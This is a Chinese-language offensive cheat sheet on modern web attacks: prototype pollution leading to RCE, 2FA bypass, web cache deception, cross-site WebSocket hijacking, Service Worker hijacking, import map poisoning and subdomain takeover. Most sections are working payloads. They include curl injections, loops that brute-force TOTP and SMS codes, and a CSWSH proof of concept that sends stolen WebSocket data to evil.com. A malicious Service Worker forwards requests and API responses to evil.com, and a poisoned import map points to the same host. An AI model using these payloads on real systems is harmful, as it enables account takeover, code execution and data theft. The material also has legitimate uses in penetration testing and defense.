# 现代 Web 漏洞补充实战参考

> 覆盖: 原型污染 → 2FA绕过 → Web缓存欺骗 → WebSocket跨站劫持 → Service Worker安全 → Import Map/HSTS投毒
> 定位: 与 SecSkills-main 互补。SecSkills 覆盖传统 SQLi/XSS/RCE 等，本文件覆盖 Web 安全前沿领域

---

## 1. 原型污染 (Prototype Pollution)

### 1.1 客户端原型污染 (浏览器端)

```javascript
// 原理: 通过 __proto__ / constructor.prototype 污染 Object.prototype
// 后续对象访问未定义属性时返回污染值

// 基础检测
{}.__proto__.isAdmin = true;
// 或
Object.prototype.isAdmin = true;

// 常见污染点:
// 1. jQuery extend (深拷贝)
$.extend(true, {}, JSON.parse('{"__proto__":{"isAdmin":true}}'));

// 2. Lodash merge (旧版本)
_.merge({}, JSON.parse('{"__proto__":{"polluted":"true"}}'));

// 3. 对象赋值 (合并)
function merge(target, source) {
  for (let key in source) {
    if (isObject(target[key]) && isObject(source[key])) {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// 4. 浏览器端检测
curl -X POST https://<target>/api/config \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
```

### 1.2 服务端原型污染 (Node.js)

```bash
# 检测服务端是否受影响
# 1. 在请求 JSON body 中注入 __proto__
curl -X POST https://<target>/api/user \
  -H "Content-Type: application/json" \
  -d '{"name":"test","__proto__":{"role":"admin"}}'

# 2. constructor.prototype 方式
curl -X POST https://<target>/api/user \
  -H "Content-Type: application/json" \
  -d '{"name":"test","constructor":{"prototype":{"role":"admin"}}}'

# 3. 嵌套 prototype 污染
curl -X POST https://<target>/api/user \
  -H "Content-Type: application/json" \
  -d '{"x":{"__proto__":{"role":"admin"}}}'

# 4. 参数键污染 (URL 参数)
curl 'https://<target>/api/config?__proto__[isAdmin]=true'
curl 'https://<target>/api/config?constructor[prototype][isAdmin]=true'
```

### 1.3 原型污染 → RCE 利用链

```bash
# Node.js RCE 利用链 (通过 shell 环境变量污染)
# 通常在 child_process.exec 中触发

# 第一步: 污染 Object.prototype
curl -X POST https://<target>/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /tmp/evil.js"}}'

# 第二步: 触发 child_process.exec 调用 (带有有问题的 shell 属性)

# 常见工具 RCE:
# 1. 污染 NODE_OPTIONS → 后续 require 时加载恶意代码
# 2. 污染 shell 属性 → child_process.exec 使用污染后的环境
# 3. 污染 statusCode → http.request 行为异常
```

### 1.4 快速检测脚本

```javascript
// 浏览器 Console 检测
console.log(({}).isAdmin);
// → undefined (未污染)
// → true (已污染)

// 更严格的检测
function isPolluted() {
  let obj = {};
  let check = Math.random().toString();
  obj.__proto__.polluted = check;
  let result = ({}).polluted === check;
  delete Object.prototype.polluted;
  return result;
}

console.log("Pollution:", isPolluted());
```

---

## 2. 2FA 绕过技术

### 2.1 备份码/恢复码绕过

```bash
# 2FA 的备份码通常是 8-10 位数字/字母
# 如果备份码页面 URL 可预测 → 直接访问

# 绕过方式:
# 1. 直接访问 reset 2FA 端点
curl -X POST https://<target>/2fa/reset \
  -H "Cookie: session=<SESSION>" \
  -d "user_id=1"

# 2. 备份码页面无额外认证
curl https://<target>/2fa/backup-codes

# 3. 备份码存储在明文的 profile 页面
curl https://<target>/profile/1
```

### 2.2 OAuth 链式绕过

```bash
# 如果应用支持 OAuth 登录且有 2FA
# 绕过方式: 通过 OAuth 流程绕过 2FA

# 1. 检查 OAuth 登录是否跳过 2FA
# 正常: 登录页 → 密码 → 2FA → 首页
# OAuth: 点击 Google登录 → 授权 → 直接进入首页

# 2. 检测:
# 抓取 OAuth 回调请求，看是否有跳过验证的标志
# 如果 /oauth/callback?code=xxx 后直接重定向到首页
# 且不要求 2FA → 可绕过
```

### 2.3 会话管理绕过

```bash
# 2FA 验证后设置的 session token
# 如果 session token 不是重新生成的 → 可重用

# 1. 第一步: 正常登录获取 session cookie (含临时2FA标志)
# 2. 第二步: 直接使用该 cookie 访问需要 2FA 的页面
# 如果服务端只验证 session 存在性而不验证 2FA 状态:

curl -H "Cookie: session=<PRE_2FA_SESSION>" https://<target>/admin/

# 3. 会话固定攻击
# 在 2FA 验证前设置 session，验证后重用该 session
```

### 2.4 TOTP 时间窗口攻击

```bash
# TOTP 通常是 30 秒窗口
# 绕过:
# 1. 窗口对齐 (发送请求在窗口边界)
# 2. 多次尝试 (一次性发送多个 TOTP 值)
for code in $(seq 000000 999999 | head -1000); do
  curl -s -X POST https://<target>/2fa/verify \
    -d "code=$code" \
    -b "session=<SESSION>" &
done

# 3. 跳过 TOTP 验证直接请求需要 2FA 的资源
curl -H "Cookie: session=<SESSION>" https://<target>/api/sensitive-data
```

### 2.5 响应拦截

```bash
# 如果 2FA 验证成功/失败响应不同:
# 成功: {"success":true,"redirect":"/dashboard"}
# 失败: {"success":false,"error":"Invalid code"}

# 尝试:
# 1. code=null
curl -X POST https://<target>/2fa/verify -d "code=null"

# 2. code 为空
curl -X POST https://<target>/2fa/verify -d "code="

# 3. 跳过验证参数
curl -X POST https://<target>/2fa/verify -d "skip=true"
curl -X POST https://<target>/2fa/verify -d "verified=true"
```

### 2.6 邮箱/SMS 验证码绕过

```bash
# 1. 邮箱验证码 — 通过注册接口重复注册获取
# 2. SMS 验证码 — 通过 API 爆破
# 如果验证码是 6 位数字且无速率限制:
for i in $(seq 0 999999); do
  code=$(printf "%06d" $i)
  resp=$(curl -s -X POST https://<target>/verify \
    -d "code=$code" \
    -b "session=<SESSION>")
  echo "$code → $resp"
  echo "$resp" | grep -q "success" && break
done
```

---

## 3. Web 缓存欺骗 (Web Cache Deception)

### 3.1 原理与检测

```bash
# 原理: 将敏感页面伪装成静态资源 → CDN/反向代理缓存
# 攻击者将 URL 添加静态扩展名 → 缓存服务器存储响应
# 用户访问该 URL → 登录态被泄露到缓存

# 检测:
# 1. 修改 URL 添加 .css / .js / .jpg / .gif 后缀
curl -v 'https://<target>/account/profile.css'
curl -v 'https://<target>/account/settings.js'
curl -v 'https://<target>/dashboard/test.jpg'
curl -v 'https://<target>/user/1/photo.gif'

# 2. 查看响应头: X-Cache: HIT / Age: xxx
# 如果返回 200 且有缓存标记 → 缓存欺骗利用点

# 3. 添加 ;css 或 ?.css
curl -v 'https://<target>/account/profile;.css'
curl -v 'https://<target>/account/profile?.css'
```

### 3.2 利用场景

```bash
# 场景: 用户个人资料页包含 CSRF Token / API Key
# https://<target>/profile 页面显示敏感信息

# 1. 构造缓存欺骗 URL
https://<target>/profile/app.css

# 2. 诱导受害者访问该 URL (点击/Social Engineering)
# 受害者登录状态下访问 → CDN 缓存了包含登录态的页面

# 3. 攻击者从缓存读取
curl 'https://<target>/profile/app.css'
# 返回受害者的个人资料页内容 (含敏感信息)
```

### 3.3 缓存键混淆

```bash
# 如果缓存键包含特定 header/参数
# 尝试添加不同参数使缓存分片

# 1. Headers 作为缓存键
curl -H "X-Forwarded-Proto: https" 'https://<target>/account/profile'
curl -H "X-Forwarded-Host: evil.com" 'https://<target>/account/profile'

# 2. Cookie 作为缓存键 (罕见)
# 如果 CDN 不做 cookie 区分 → 所有用户共享缓存

# 3. URL 参数分片
curl 'https://<target>/admin?page=1'    # 正常
curl 'https://<target>/admin?page=1.css' # 缓存欺骗
curl 'https://<target>/admin;page=1.css' # 路径混淆
```

---

## 4. WebSocket 跨站劫持 (CSWSH)

### 4.1 基础检测

```bash
# 客户端 JS:
var ws = new WebSocket('wss://<target>/ws');

# 检测服务端是否验证 Origin
# 1. 从正常页面建立 WS 连接 → 成功
# 2. 从本地 HTML 建立 WS 连接 → 检查是否被拒绝

# Python 测试
python3 -c "
import asyncio, websockets
async def test():
    async with websockets.connect(
        'wss://<target>/ws',
        origin='https://evil.com'
    ) as ws:
        msg = await ws.recv()
        print('CONNECTED:', msg[:50])
asyncio.run(test())
"
```

### 4.2 CSWSH PoC

```html
<!-- cswsh_poc.html — 在攻击者网站部署 -->
<html>
<body>
<script>
const ws = new WebSocket('wss://<target>/ws');

ws.onopen = function() {
  // 发送获取用户数据的命令
  ws.send(JSON.stringify({action: 'getProfile'}));
};

ws.onmessage = function(event) {
  // 将窃取的数据发到攻击者服务器
  new Image().src = 'https://evil.com/steal?data=' + btoa(event.data);
};
</script>
</body>
</html>
```

### 4.3 WebSocket 跨域读 (CWS Injection)

```bash
# 如果 WS 服务端不验证 Origin
# 而且 WS 消息格式可预测

# 1. 监听 WS 的推送消息 (可能有实时敏感数据)
# 2. 如果是聊天/Watchdog 类应用
# 攻击者可以: 读取聊天内容/监控信息/交易数据

# 检测:
curl -v -H "Origin: https://evil.com" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  https://<target>/ws
```

---

## 5. Service Worker 安全

### 5.1 Service Worker 注册劫持

```javascript
// 如果注册 sw.js 的路径可被 XSS 控制
navigator.serviceWorker.register('/sw.js');

// 攻击: 通过 XSS 注册恶意 Service Worker
navigator.serviceWorker.register('/api/avatar?img=./sw.js');
// 如果 avatar 接口返回用户上传的图片内容 → 可作为 SW 注册

// 检测: 检查 SW 脚本是否从不可信路径加载
// 在浏览器中:
navigator.serviceWorker.getRegistrations().then(function(regs) {
  regs.forEach(function(reg) { console.log(reg.active.scriptURL); });
});
```

### 5.2 Service Worker 请求拦截

```javascript
// 恶意 Service Worker 拦截所有请求
self.addEventListener('fetch', function(event) {
  // 将请求转发到攻击者服务器
  event.respondWith(
    fetch('https://evil.com/proxy?url=' + encodeURIComponent(event.request.url))
  );
});

// 或只窃取特定请求
self.addEventListener('fetch', function(event) {
  if (event.request.url.includes('/api/')) {
    // 窃取 API 响应
    event.respondWith(
      fetch(event.request).then(function(response) {
        var body = response.clone();
        body.text().then(function(data) {
          fetch('https://evil.com/steal', {method:'POST', body:data});
        });
        return response;
      })
    );
  }
});
```

### 5.3 SW 缓存投毒

```bash
# Service Worker 可以劫持页面
# 如果页面的 SW 范围过大 → 可控制整个站点

# 检测:
# 1. Chrome DevTools → Application → Service Workers
# 2. 查看 sw.js 的 scope 是否过于宽泛
# 3. 检查是否有未认证的 SW 更新路径
```

---

## 6. Import Map / HSTS 投毒

### 6.1 Import Map 注入

```html
<!-- Import Map 定义浏览器模块解析 -->
<script type="importmap">
{
  "imports": {
    "lodash": "https://cdn.example.com/lodash.js",
    "react": "https://evil.com/react.js"  <!-- 投毒点 -->
  }
}
</script>

<!-- 如果攻击者能注入 import map 条目 -->
<!-- 后续所有 import 'react' 都加载恶意代码 -->
```

### 6.2 HSTS 投毒 / 302 翻转

```bash
# HSTS 投毒: 通过 HTTP 响应设置 max-age 导致
# 后续 HTTPS 请求被阻止

# 302 翻转: 如果存在 HTTP 302 重定向到 HTTPS
# 攻击者可在 HTTP 中间人阶段修改重定向目标

# 检测:
curl -v http://<target>/ 2>&1 | grep -i "location\|strict-transport"
# 查看响应头中的 Strict-Transport-Security
```

### 6.3 子域名接管

```bash
# 如果应用的 CNAME 记录指向了已删除的服务
# 攻击者注册该服务 → 控制子域名

# 检测: DNS 查询 + HTTP 响应
nslookup <subdomain>.<target>
# 指向 AWS S3 / Azure / GitHub Pages 等
# 且返回 404 Not Found → 可注册

# 自动化:
subjack -d <target> -v
```

---

## 速查表

| 漏洞类型 | 检测方法 | 利用难度 |
|---------|---------|---------|
| 原型污染 (客户端) | `{}.__proto__.x=1; ({}).x === 1` | 低 |
| 原型污染 (服务端) | POST `{"__proto__":{"role":"admin"}}` | 中 |
| 2FA 备份码绕过 | 访问 `/2fa/backup-codes` | 中 |
| 2FA OAuth 绕过 | 通过 OAuth 登录观察是否跳过 2FA | 低 |
| 缓存欺骗 | `curl /profile.css` 看是否返回登录态 | 低-中 |
| CSWSH | Python ws 自定义 origin 测试 | 中 |
| Service Worker 劫持 | 检查 SW scriptURL 是否可控 | 高 |
| 子域名接管 | CNAME 指向已删除服务 | 低 |

---

*参考: portswigger.net, snyk.io, developer.mozilla.org | 与 SecSkills-main 互补不重叠*
